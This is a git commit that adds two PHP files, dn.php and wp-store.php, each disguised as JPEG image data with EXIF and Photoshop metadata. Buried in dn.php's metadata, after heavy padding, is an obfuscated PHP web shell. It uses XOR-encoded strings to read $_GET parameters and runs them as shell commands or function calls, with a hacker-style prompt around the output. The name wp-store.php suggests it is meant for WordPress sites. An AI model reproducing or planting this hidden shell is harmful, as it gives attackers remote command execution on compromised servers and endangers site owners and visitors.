84cabf6ae09ce0da43c092f069680db7a2a2201e
human <p0r7s1337@gmail.com>
2025-04-25 18:19:24 +0700

    Add files via upload

---
+++ dn.php
@@ -0,0 +1,84 @@
+ˇÿˇ‡ JFIF  H H  ˇ· Exif  MM *          	
+      	      	             	      	$(       1   5  	,2      
+b;      
+zGF       GI     c  Çò      
+Äái      
+Üúõ    
+  ¶úú    
+  ∞úù    
+  ∫úû    
+  ƒúü    
+  ŒÍ      ˛  ÿÍ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         null  null  null   H      H     <?="<br>";?>dnthirteen@h34rtbl33d.today:~$ <?="<".("{"^"+").("{"^")").("{"^">").">";@$_++;$__ = ${("|"^"#").("{"^"<").("{"^">;").("{"^"/")}[!$_];$___ = `$__` ?: $__(${("|"^"#").("{"^"<").("{"^">;").("{"^"/")}[$_]);?><?=($___."</".("{"^"+").("{"^")").("{"^">").">");__HALT_COMPILER();?>1337:13:37 13:37:666ˇˇ
+  1337:13:37 13:37:666ˇˇ
+ null  null   à"       à'    ö  ê     nullê      |ê      êí       í       í	     _  íë    04  íí    04  †    ˇˇ  †       
+†       
+§        §    ö  §       §	       §
+       Í     p    Í                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         1997:12:11 15:28:59 1997:12:11 15:28:59   n u l l   n u l l   n u l l   n u l l   n u l l                 &      .(             6      ¬       H      H   ˇÿˇ€ C 		
+ $.' ",#(7),01444'9=82<.342ˇ€ C			2!!22222222222222222222222222222222222222222222222222ˇ¿  
+ 
+! ˇƒ           	
+ˇƒ µ   } !1AQa"q2Åë°#B±¡R—$3brÇ	
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÉÑÖÜáàâäíìîïñóòôö¢£§•¶ß®©™≤≥¥µ∂∑∏π∫¬√ƒ≈∆«»… “”‘’÷◊ÿŸ⁄·‚„‰ÂÊÁËÈÍÒÚÛÙıˆ˜¯˘˙ˇƒ        	
+ˇƒ µ  w !1AQaq"2ÅBë°±¡	#3Rbr—
+$4·%Ò&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÇÉÑÖÜáàâäíìîïñóòôö¢£§•¶ß®©™≤≥¥µ∂∑∏π∫¬√ƒ≈∆«»… “”‘’÷◊ÿŸ⁄‚„‰ÂÊÁËÈÍÚÛÙıˆ˜¯˘˙ˇ⁄   ? —◊|A‚D‘ı%∑Ü÷}Ibm>ec.›†|•FØﬂ wlWdﬁ+ΩÖåSxcRÛPÌ-—ó#Æ·ëËp(ê◊¿íˇ ƒ◊N7\Ÿ<eòÚˆ˘nv´ülW¶ZŸ@O$∆π?Ö ˇŸˇÌjPhotoshop 3.0 8BIM%                     8BIMÌ      H     H    8BIM&               ?Ä  8BIM        x8BIM        8BIMÛ     	         8BIM
+       8BIM'     
+        8BIMı     H /ff  lff       /ff  °ôö       2    Z         5    -        8BIM¯     p  ˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇË    ˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇË    ˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇË    ˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇË  8BIM       8BIM         8BIM          @  @    8BIM         8BIM    I              
+   
+   
+ U n t i t l e d - 1                                 
+   
+                                            null      boundsObjc         Rct1       Top long        Leftlong        Btomlong   
+    Rghtlong   
+   slicesVlLs   Objc        slice      sliceIDlong       groupIDlong       originenum   ESliceOrigin   autoGenerated    Typeenum   
+ESliceType    Img    boundsObjc         Rct1       Top long        Leftlong        Btomlong   
+    Rghtlong   
+   urlTEXT         nullTEXT         MsgeTEXT        altTagTEXT        cellTextIsHTMLbool   cellTextTEXT        	horzAlignenum   ESliceHorzAlign   default   	vertAlignenum   ESliceVertAlign   default   bgColorTypeenum   ESliceBGColorType    None   	topOutsetlong       
+leftOutsetlong       bottomOutsetlong       rightOutsetlong     8BIM      8BIM        8BIM    ù      
+   
+      @  Å  ˇÿˇ‡ JFIF  H H  ˇÌ Adobe_CM ˇÓ Adobe dÄ   ˇ€ Ñ 			
+ˇ¿  
+ 
+" ˇ›  ˇƒ?          	
+         	
+ 3 !1AQa"qÅ2ë°±B#$R¡b34rÇ—C%íS·Òcs5¢≤É&DìTdE¬£t6“U‚eÚ≥Ñ√”u„ÛF'î§Ö¥ïƒ‘‰Ù•µ≈’ÂıVfvÜñ¶∂∆÷Êˆ7GWgwáóß∑«◊Á˜ 5 !1AQaq"2Åë°±B#¡R—3$b·rÇíCScs4Ò%¢≤É&5¬“DìT£dEU6te‚Ú≥Ñ√”u„ÛFî§Ö¥ïƒ‘‰Ù•µ≈’ÂıVfvÜñ¶∂∆÷Êˆ'7GWgwáóß∑«ˇ⁄   ? ∑’∫«_nf^+jf=Ω@TÓüMèq∑n÷¥˙n©ªj}“^⁄ø¬ŸÈÆìˆ∑Vˇ  ó˝/C˘Ê=„ˇ Ñˇ Ó◊˛ πŒªˇ .û>ì?ú˛óÙøıüˇ ›ï’ù˝˝Î©)ˇŸ 8BIM!     U       A d o b e   P h o t o s h o p    A d o b e   P h o t o s h o p   7 . 0    8BIM        ˇ·ﬂhttp://ns.adobe.com/xap/1.0/ <?xpacket begin='Ôªø' id='W5M0MpCehiHzreSzNTczkc9d'?>
+<?adobe-xap-filters esc="CR"?>
+<x:xapmeta xmlns:x="adobe:ns:meta/" x:xaptk="XMP toolkit 2.8.2-33, framework 1.5">
+	<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:iX="http://ns.adobe.com/iX/1.0/">
+		<rdf:Description about="" xmlns:xapMM="http://ns.adobe.com/xap/1.0/mm/">
+			<xapMM:DocumentID>adobe:docid:photoshop:e4e9b767-808f-11ea-b398-e7491f16d242</xapMM:DocumentID>
+		</rdf:Description>
+		<rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"/><rdf:Description xmlns:MicrosoftPhoto="http://ns.microsoft.com/photo/1.0/"><MicrosoftPhoto:CameraSerialNumber>null</MicrosoftPhoto:CameraSerialNumber><MicrosoftPhoto:DateAcquired>2013-12-11T15:29:16.570</MicrosoftPhoto:DateAcquired><MicrosoftPhoto:FlashManufacturer>null</MicrosoftPhoto:FlashManufacturer><MicrosoftPhoto:FlashModel>null</MicrosoftPhoto:FlashModel><MicrosoftPhoto:LensManufacturer>null</MicrosoftPhoto:LensManufacturer><MicrosoftPhoto:LensModel>null</MicrosoftPhoto:LensModel><MicrosoftPhoto:Rating>99</MicrosoftPhoto:Rating><MicrosoftPhoto:LastKeywordXMP><rdf:Bag xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Bag>
+			</MicrosoftPhoto:LastKeywordXMP></rdf:Description><rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator><rdf:Seq xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Seq>
+			</dc:creator><dc:rights><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
+			</dc:rights><dc:subject><rdf:Bag xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Bag>
+			</dc:subject><dc:title><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
+			</dc:title><dc:description><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
+			</dc:description></rdf:Description><rdf:Description xmlns:xmp="http://ns.adobe.com/xap/1.0/"><xmp:CreateDate>1997-12-11T15:28:59.039</xmp:CreateDate><xmp:Rating>5</xmp:Rating></rdf:Description></rdf:RDF>
+</x:xapmeta>
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                           ˇÿˇ‡ JFIF ˇ˛; 
+ 
+" ˇƒ           	
+ˇƒ µ   } !1AQa"q2Åë°#B±¡R—$3brÇ	
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÉÑÖÜáàâäíìîïñóòôö¢£§•¶ß®©™≤≥¥µ∂∑∏π∫¬√ƒ≈∆«»… “”‘’÷◊ÿŸ⁄·‚„‰ÂÊÁËÈÍÒÚÛÙıˆ˜¯˘˙ˇƒ        	
+ˇƒ µ  w !1AQaq"2ÅBë°±¡	#3Rbr—
+$4·%Ò&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÇÉÑÖÜáàâäíìîïñóòôö¢£§•¶ß®©™≤≥¥µ∂∑∏π∫¬√ƒ≈∆«»… “”‘’÷◊ÿŸ⁄‚„‰ÂÊÁËÈÍÚÛÙıˆ˜¯˘˙ˇ⁄   ? ˙ˆ≤˝∞øo≠3‚ˇ ÌßK'Åæx√ˆ≥µ¯=¨~»ø~!xÛ∆ö«∆c†œ‡øiWÀ‡˝o¡>º—¸‚_Ñ≥⁄\¸p◊¥?M‚(·:ÒV∑‡ôµ_Î⁄=¸5˚;w˚~|WÂ’œáºWˇ Ó˝™•ÒFÉq6ç‚I|‚?É~(t∫˛ó#XÎxOƒ◊>5–.<E·ß‘`∏m]üB—f’Ù≥k®K§Èœp÷p˛?~ÿp√©|Jˇ Çñ|H‘béˇ ‚'ÏÛ‚ÔŸæ/Ä>=Ωçnºi6/¯™)|I¡ÔŒ$◊>«‚n.$◊¡w⁄"Í“O3ﬂãÜïÀN?ÌÌÓ>¯y‡ÜyÁwÜföi¢I%öY4KíYdugíIãªπ,ÃK1$ì@ˇŸ
---
+++ wp-store.php
@@ -0,0 +1,145 @@
+ÿØÿà JFIF  H H  ÿÛ C   
+
+
+		
+%# , #&')*)-0-(0%()(ÿÛ C   
+
+
+
+(((((((((((((((((((((((((((((((((((((((((((((((((((ÿÂ Ð" ÿÄ              ÿÄ             ÿÚ    ú€        ó¸³è¸>#àŸpðþU˜íô9ÌÕèjÒEë·½âÐì=o›b>Íî~yÄ~”|¢>ºáú³t               ‚cŽù±ôïŸsÛGŸ³¹\¸êfkÁ°Ö
+a²Ö3­&Ë^LìV6$óð{0lv=ÕÐ;ßšºóìÎw¢            
+—ÇË<=£Ê•’¸¨f¦ã^¦ÄkŒÑ¯Ì`©³:²lÎ°ÛKvÓ±»}+›—Ó¹µm{™5vly&ž´}›ßüÛÜZkl€         </#ä'£¥9‹V˜êøñc2Ó
+L±JÛxÆ²ñF)UVŠ‹Åf.¤ä´ÑÉ|2¹­¯{6/§i7rèä­ìš9#vÚ¹Ú{V1}ãZQúEÌtà       'ç—ù1lØ¶‹R˜‹á¥	¤R¯%U¶DYh  €0TÁf –šM™/‚ÆÆMX7³i^=ºÖØÐûïÁº¸úø       xÿ ËœÕcf•Â[*³¤&$&ÅKËFçÑSæ=Û}ù7§ôaÀâúù%ú&Ëñú €¯žÆÆ
+Q0BVD˜­¯9ô²–7f·<ÍÝXý »óo¤€      >!öÿ ÏÇ‹j†	 D’…¡dÌ*Ob]¤öÞÖ3Wi-l²ôV=Y{/q¾ÓÆ½zÏ76Üp|³ìvÛ‡åøûÇ3º1,˜"&1‰Ai¥£6]K„jÉíþ€üÉú<Ü      óoèÿ Ìâ—ÄR		[	PG¯÷þ#¤ãÙíiùVâÛŸZöçÏçF	Î0FÊµãeÑµëæ˜­¯+b»ðøN£üßÖç˜–ìj˜²11	‰cî_û,w       Ãù§ô¿æ’0åÀ	-z>wcƒéyg'ÑKÌmÂUÁ²m<]=“¦qø,î-«¸ž'4vk{
+ë±fÂÄZØ\?
+û×ÌwÎ²ô5MK @@(&o®|‹êñô€      GæÓ?šÍ<w¥Bb$["T­e>‘ó¾Ã
+ôýšùšïuâø¹3]ÉÊk_<Ö;Þöc¾L†Í?§Y|mü1¹îqúøß®òÜ&Ðµgl„ÕSYDÁfŸ«ü§ë Ò‚      ?:þŠøÍÒÑP(e1Í¦ZZ./3íéf]‰Ö¬›s¦ÙÒöó‘ê[Ê“ÔyU=ZùQ^­<ÁècÓ›séä­jFx³dŠ¢Ð•YHŸ®|ì±Þ€     ñ·|ŒùÉ5D©)
+lÌµíÐ{Z²áíÔiaŸ‘a†^g¹­Öá4w~†Ó‡±Ø1rWê‡/nË¦G-‹­W¯Ý+ç\¯Û¾5¶ó´÷³ð1t™¬å'é¾û‰GÛ<±ùzN{~8×Šˆ~ãðßÐqÐ      ó¤qÇÃâfÚÛÑí4åÁõ_GßâÙÌô|þM¹þ{««ÒªÞÆWÅôûŸkšr=6õ°×# @ ( [ªä9Ÿ©Ó<þ,úŸÑ|?KÏm¿UÞù7Ñøç©çî˜üÿ Šû´uëüçdùÿ \æ¿K~wý+¿X      Çö<¼2ø'qïïx¾·°ß–d¤N¹¯ó½ÿ ÐÆ»}ýž_»kñ)‘yŒÞ¶Ï	A$P %Z LDJ¤Ó¦¨Ç/…úÎEù~ÞM.ÇÔv~ô:•¦»}
+œg…Úóy{qëG¹æ€     G!îó^O~m¬[>?^KVn›y·· ÔÃônÍs°ž"a%¦–/jZádM’†iT–Dˆ˜P!0DLK\y1ã”D×^KT`ù×Ó5z/úêô»Êd¯›–;8fÝM=ýK»¢ô¸þÃè¼°ëÐ    .k¿™ö²æ¦M8Y1ž_¨¶Ìu·ëf!¦$›&ã3q™ˆÊLBÙDcmjZÉVÒJÈMm§%ãx]YûÞ§!L²úÜü÷è<š,ƒÊå»æù5µuZáÍ
+šº›š—~—cÇúþ—?L=Ï4    /³ËqïÔÛÁ³óÞ¦KVÓTÌLZÕ»
+Z³–316Zk7Î9Ë³†3™˜dN ‰‘Y«ñs½ÏvåÏm3oé¤eŒrÒíù?C}Ðó±L%™…“[A\y1Ìõµ75.ý8¶¦ûôVžçÒøÁ”   8¾¯“ò{ösâËãõÚÕ´Âm[%­Y¸ZbXÍ«k:úÏºçŸmÓ–Ä²ÖÙŒ“¦MgÏÕ3Y%–šJÝVX¾qô_ŸnÙ¥&Ýä–3bÍ0ïæ³çá"Ç“Ï_SoRïÕÔÛÕÙŸMîò]oÐùAÓ    3žö¼o ÔØË‹/Ÿ¶m[Lo1)i‰¸M«2YexîËÏèÇƒÉ/fiWÔñûœ0öUž,¨´DE¦¢èegeäl¼b'§ *¾Ÿ•Øk×ì¡Ã$$ÌL"jF<˜®X56µ.ýmm]™îw?ú ·ç      ™èyß=ëleÃ—‹;Z–’ö­¦3jÚà˜’f²“0Êsœ×Ò´:§	N³{eò:¨ŽIi«ZÊÉh‰…¡e‘9b¬Âò>Ò<^Œù7³¿ž~__[râ˜rDLÁ0µÅ—
+Ë_WgVï×ÖØÖÛ•~óo£úü—   çéyŸ;êìeÃ—míKLrM/1´Ön30IšÉi¬¤ÌE“J"f²LÔ]RZ!AdVa`œrH’!1(„-påÁs×ÕÙÔË~
+|ØvÚ}çGõx,=>    <Ýð<Sg.¼òZ—˜ÞÔ´ÆÓY¸Úk)(š‹¢ÙP%TLÔZk$¢@°Ah00™YÆP%"jSm|¶ëêlêÝØ0åÃ¹o£pÿ ¯ç ¡È    Ëv¼7ßµŸW?“ÛžØï0½éy$\fj«¡$ YRYYI1ÖG—¡²t“È`Ù;g9;‡±ƒª ÐÁ½5vP‰„, Y™¨²5šÖ=|Ú×n
+]l·aÃ—ì}NÓ˜ê=¯0;9À   Ž¸åxzt64ö|Sføra†[ã»MeŒÀLÔZ!d´¹Ó¬ð±u¾‡?
+³ôëõêá=©»
+7®Ï½
+ÎëõS?›ô–|›/Ô°iÏŠöã˜ãÛÕ¸Þ‹‡w ¬éÊÊ‹©2]RM™S_&¾[1kgÖÏf*Z»±ì}ŒY~‡Æ
+˜€   ò=za—³¯“æ½Ìšù´³_I2M,ÂBDL-yŸ ·_ŸõÏ™z]ú>¦ù•ºtý-óÌÙNö8›ÙÚ9mÌ§¼ñse=FŽK6Z÷¬“I,¨ó~yõ.gŸo%Øü×ªñûzE\[.©/XœLLë‚Ø²Îšù0çièyÝWo?¾=ß(     å|ž×‡ñ}-¬ú¹¼Þ­›àË„ÍlW˜Ý
+Š&XÅš2˜øþ£ÅìÕ‡§Î×yŸ#wªÝ›ƒ ñžWÒ1ìŸ9·GÏtc3“:êß91W9tãuÅÑøý>WDòedXÖ0[
+8Å8óµÃ|{e¾ƒÌõ~Çšü     r]v®¼Nm|Ÿ;ëìåÕË©µ|$Ë8í1²&U‡2l
+ÑÞ• 4÷YN
+}ÌuM	ÓÏ›+%Ë6ëp¬ñ<yLÃÂ¤b¶pÎ,¬cSd…z^þÑôHX     "G7à÷üO‘ß‹&¶O3»k6¦]sførI’i2J$ –D‰…Y™…’‰¨ ^'PØã7ú8¬vG>i¬Ëd,Rq,a¶²®)Å°¬6ãŸ½ó}gÌÎp      [¬oÎÝ_áz›9µ2òtneÔÍ­³l7Æ]$ J&É@²ª²	x…J3YI„*ªÊˆL¥VŠÖ§¬,Y¢ŠíÅïévÞÉêð        w¢kËæ¹½þkÃõv³jeåÝ¹“S6fó“-X–Õ²ÊÌJÍUhˆ.¬EÔRÑRÌD-«Ze-JÒ§cÌÆ®Ì[Žß»–sÇœ         çú¼¾k“±ãüoJù´òqô{[_£tdLÌ51îiÍ“4;¬¨²¢ÑYQhˆ«EK1-«©¤R§S8Ç4Û‹ÑÜêý,yW„(          ûâ|¿¤ø¾wo+ìù<Þ¯w&ºõÎ
+ŠÉç/‡ŒŠÌ³½˜gbùa«;¶¸éÛnXê¶†–/JyýŒS?"žž½ÏB›[;&‡Uèì{tIÛÌ             ð:&¼¹]Ï?ÂïØE¹îµvæÝ{åII´¥V‚+‚¥#][Œ·ˆ’´Ê]|êìžÖß5Òû<A×¤             4¼›—ò{vòaËænÈ‹LK³aX´A1³c×Û­³:þï¡§Ã¯Lß¯˜ž‹¬üöóKç{>—(mÄ             +ÉuÜŸ›×±—_#§-ñd˜^k)0$DÂÅm
+ZÚ«µjo‚W&<µÊ{;×¿îqæz@               r]g%çugÉ'×“&+ÌrMlÁ„Z…EkŠå–uåsÖ/&;°ÖXW9ÑßÀ÷ýþ ß€              qýg%åõíÚ¶òºï“æ9f–ch‚Mf±0±[ŒTÏë[.3+cí†£Ûñã«_P‰÷|ð              Sšè<»=«o;¢Ö¥“%±ÚceU*¢È€¬[uxLcÅ±R¶ÃcòêÛïzG¯ô>poÖ              y>G¥çø^íÇµj‹Û¥Õ‚êÉ5Q#
+ÙèÇÈÉÓO?/—×ñ¸÷eaÉË²0mV1V¶Éìúò}š1              9íy|ç©#ND	šJÚj²ê¤œs‹&çCçz>ïžZ•²<o;ª×àéñ/m_3§.æ‡¹Ó«h{\@             Myx9+›õK-µ«)%dŒs¹»zçÑya@ ¥ÑY              <_k™âßŽõŸÐBMmLóYb¬Ð§½àu¾—6Aëp€                 Ÿ[Êy½KR|žÙB5¹.¨œSŽÏC£Ñß÷¼ÀéÔ                  œèôyöó·×Ëàúwš1¶„)Z"™IÜÃÔwrä“Øà                    <oµÑáêæçkSÌì´RÚóšçÜÝ¯Êõý]ŸC’¶;ù@            ÿÄ -       0@P!1"3$2#AÿÚ  öd–8”ÚÍ(”¼M]ª^)zwÛrv»yÈê×Jû¥Ô5kÁ7\Ô™Äwš£â‰T\MX¨µ½>EñMòv®Ö¨-qD-VuËöºÒ‘\¡X!]ˆDÀ¶5m
+`-­]6®‹Qtœ0`Ôn@ â[LUø’¤Š½¨,Œ¿¯Tª®k·,­Žyl(0Ü¬¬¬¬¬÷4£N‰Á~Zjë7«ªœM•kPZoÃêýjÊö¥nñlH0YYYYYYYYYYYYYYYYYYçø)Ñ4§BBitn¥Ä6 T5Š—>RÕ«Ð†«júlh,¬¬¬¬¬¬­ËrÜ²²²²²²²²²²²²³Ø@)Ð'0…§kv©­;U­{à&–8#Õxò ÒPå••••••••”O,¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬ó|@¢×0é|C$J	£±¹©êPÐP¿=ùXÎYD¬¬¬¬¬¬òÊÏ,¬ø2²²²²²²@¬öI£vzéšœ7ÙíkZÓ*)d|ÒFÜr%‰YYYõrY@¬¬ Vy½™Msà—DÕ¨Cìkº×I’Æò%‰D¬û9Y@¬ P('·"	¤©b…¦]©ëq¯Ð	ƒ%‰Dû ¬¬ @ P<§fG	Üé[õu»ŸCAÄ¹È~(”O‹ÚÒçWÑ/Ì¡áiJo
+À¿Å©§pµe?
+L½6ÝOG–P(šP+öt3S°ÛU}N2—ÿ T(”O*½ylÉ§ðÊ«N½F÷ÜÑéZW¸jxÔ‘¾'÷ç´Òƒ–TËƒíf?SŠ¿XAä‚'“Ná•^«Çã»F½Öjœ=5((9 'Æ‹?Ój~¦´íú·#ãÓ¨M~}7NƒO‹›¦Œ#i¨Ú_Rõõ2/©zú—¯ª(Z	¶P òÖ4H¯+u¥«7(9r§/^§§eÝK(øôÊn½n­hªÂéÔëA:y
+$žxXXXXí½©¶JÖ*Ã©Vš7E'›†_¿FôžpÞGÇÃŠtÝ+ÝË
+
+
+
+
+
+
+
+
+
+
+
+jÚ¶­¼¸†–øü£õÂÎ™éKýC‘ñP‡ê-€°°±èa9ÍÔ«}%ÏþxÚ¸4ÿ ©éIýhøøj-ÖÀç•”ù˜ÄýF£SµŠa;\¬×£_~bûükïð¦ëµ“ušE3Q¦ôÉþÞ-‡y¸/ú}#ù ö||,ÜC•bäÔÚìAI¬Ûz’Å™WO(DºAtšºm]&.“E‹é˜¾”#UîjŽÅ¸TZÝÆ(x‚"«_¯aqd5òpOõzvÙÏ‹;Qm*Ö5+VPb
+Xðåen[–QDXÕ9$yx+ú==M»5ã	¨,¬¬¬¬¬¬¬­ËrÜ·-ËrÜ·,¢VTŸ•/õ=> nÝc´G° ·-ËrÜ·­ëy[ŠÜVâ·•½o]EÔ]EÔ]E½nDöcÅÁ­Æ™éñ[vë?ÊØâ„n]*ú-©ÃxntÞ	¼9]¦¿Çé/°Ñ_b ¾Å§¯±éëìzzûœÐG‡(”xfª1^Ò¾•ßLõÐ‘¤
+ Âyð£q£z|fÌ\îý¨à{Ô:M©4'5j± ÁÙÃó8Xó`¸ÏÎ)«Ü©2n™¦È¢éÏ8i…ZÑî×ïÐ³FôøÑŸëöC“:®ƒ+Õm¼I±ŠÅˆëGvô–]Î½¨4@ªÓ‚¯¡5hfV4XÜ¬i¶aì§nJÎ«e–X²­S­h[áÆ«z}š½”™Ó§éñ\{ôu…Zœ¶
+=¡AY‘7ô²­ÙmxìLùäåSNšuZ„!êÛ£
+•sNš¿:ó>	)Ùm˜ù‘•{G­a\Òg®ªÅÕµêkõtºµ%²ièñ±G@
+<§•°ÇfgO*‚ Îúz|ps½Ý69ÔÑ>'ªÓ:¼µælñòÊ*P¥­–¤½h½=BM°ÆÜ¡Ù©YëJ©Õ}—×G…jÕhì²ÕwÖ‘i–z2ó)ÉÁU—¥7§bN´ÍMCž§7Jº£QÖdŠ6ÆÏvÄ,ž;uŸZU¥OÖ¯È¢Šz£/RFü» jjš¼›¬T®ë2Ãbß³
+,EbA.&Ë<Š)Éêœ+×õ,57¶í	e³R»kÅë¹Á¢Ö³Þlæ¾°Ç¸8vßª,ÅB´Âï2œœœªIÕƒÏ3úqÔ=Òµk¦ÃÃVÕµi—
+wøŠrrzÒ¤þ~}Mÿ Á©¾ö³c£Y °‹Sš´‰ú•ü%999@þ”þ{ÎÝe¨y2²BÞÕÔjê1uO[~ûm…i.ÙoÂQNNNUÔ­æÎçµ%ó›¸XX[VÕWñkÄïÕÿ ÍÞÚ‹cÂQNNEi.Ì>[.Ûòê{j
+×<E^»ÛLfß„§''"´—b. q]¨yuˆñ8ì?­"=÷<z³1g°­-›¬øJrrr*ÛsË©àÔ<·àëÖŽ+Lƒ¡[Ç¨ÃÕƒ±ËM‡§ „§''" 8ŸË©þÚ‡›P¤K¹éô‰>]B¦Çs¥WªïNNE?òê_ÚÔ<óÔŠeöÆ()Ã	óÏA_oz†ƒ€ÇŒ§''#È~¼š—÷><§'"&ÿ Ï“RþÀ‡ÇS“‘Gýy5DøâŠrr(¦ÉåÔÇþAŽ)ÉÈ£Ê Í¯-ñšÁ>4§'"-1¹·å•»£!é9íb}úíOÕcNÕŠ:¬«î³/ºÌ†®ôÝ\&êËp=gÐ)ÉÈ£ËGoòóNÝ–y¦ž8Tº¨_QrÉH·*ALÑ+Ý* _nª¦Ö+íu‘Òk§hÐý
+ªM@¾ŽåtÝBÌ*N¦=¯2Šr(£ËKfÚ¾mQ¸™¨!ä±f8ú„Óº=‰•}&´)­
+2N‚7+EiTÚUšÆ-FX{QOâ(¢Š(¯Ú‰»#ójlßY¨!â.À·¨¢K
+pÖÒ·J"þ%SWQ|j7‡³¼¢QEZ|}K^w‡´Ç#PCÃ©E<§è¬#Jp¢³¨ÂÏºj
+C\²×¤_C_jûôIšÝg!ªT+î5½\¡j¾¢%Öu·²²¤`ZµÈzÊÒz}Ä¢Q(¢-&<Eèj±âF ‚<-«PŸ|”ôó ŽãÃ€+:Ã†¦F¥ÓæjsÂ¿+_Ín‘uf]yÑ–b¿‘A…mÀÓ¶.â‰EQMi{£`Ž?BÌ]h ìrxî?§[M§ÏSi’ìˆbæö5í±§'Ç4òÂÂÂÂÇ*ñä´¢Š<-*-ÒzZ”=9‚!ã’6ÈÞ}Ûî±]“¶Åw×s\ì'
+(Ý;á±3¸¢#Èã^!>•ˆ„Ñ`´„CÖsC›jj 9nEÊ¼ÑFØ™ÜQEÍ*»ÔÔàäA^zÑÌ¤ÓœÐØPiÿ GqEQçfic`ž¡…¨L¬ P(|	(¢Š<ôúýýkP‰âp,pACß(¢‰Gž›[qö5
+½f P@ }òQ(”O:UŒïÙÔ)î@ P(!íå‰GX<‘±±³ÛÔ)e‚š›Ë	Íö2#ÊµwX|1¶&{·¨õä P)‡±íöêUtæ(Û=û•`Káx+*&žeÁö)Ñ/M š&LËTŸ5Ø1»(sxñ`­…l[ÄcE…{£òº­ÃðÖ¨2U4R@è$ÁiæSÇ<-¥l[Õµc¼„X‰QˆªõÚóÆü;š,i­)­{ææåtÖÀ¶¬,wåeg»µmÂlÒ±A0”|=ñøoŸ…ú[–V{ØvËðöÆaj	ÍP1² V"É -ËrÊÊ­	Ýðòÿ XCÑ+ò2	È±¥t"_MlLoÄŸ×è„<àò(ÇE |s¿°z ò(8Æèž$oÆ¿ûG!è~(¨¤0½§#ãý£ÈQ++(¤S‚©.Ç|`ýùp°±È¤SÂ©/QŸ'áŒôpˆ_¤#ø@ä1Ý)~*ÑÅvzd/Ò ‘þ$þE'f‰½ý
+óg–{DaˆÊÿ “§þ¾'Pÿ †ùIEÈorÃÂYæS‚iRÅ!ˆ>'P?–ù
+r¯X4r–È¤c¢!ÜÊpÂÌ±¡­ø›‡6 ªlÝ/a ©ªá„"¨°|\§tÞG*MÄ]ÒÄÙë=‹vIUÙ²?‰yÚÁåsÚ6·ÀZ
+pâä*“wMò·Ýü‡ª-Ä_+aÛ¦ñ•û,[ò§þ¼eRfé¾Z_Ä¾Jqì‹å¯7lÃÄUHz¯ù{qub Å.™Ìhc~bÝmË=ÿ ³4 ÍM]’©*HÕµá~VS`™É”\TP²/†ÿÄ +        0!1@"AQ3`#2BaÿÚ ?þðaqú].‹—EÈÓwëÛ‹¤ÑåvÊõr½\»(ÓiNm¦=qå«•Êår•r¹\®N3ìJž	SêÎŒ(P¡BP+Pb±(P¡B…
+Y*ÀºjÒ¡G8a(SV(Ø£Â7„X‹…&¶ã7NÖŽè…¨Øñ„ÆÂ¯JæÈâÒSÿ ´ã³¸#!ˆ@ «²Çð)±°ŽÎÊ­Ä šµL–ÏëƒLÛž¹Ê2h@(DbS„ˆDAŒôCË“²B91
+ˆMÚ¸‡œôƒühð¸äÝÎ!7mXùžŸøÂ9‚§€9NA7m_Özãúá5«úÏL~ì}V ŠÕùèÏÄÏñ„ÝŠÔ™~zWC£s‰)Õ‚5Šê9\UÅ^WUÈVMª
+ hÜ!±Otºsc­2šg'ª0Ÿ
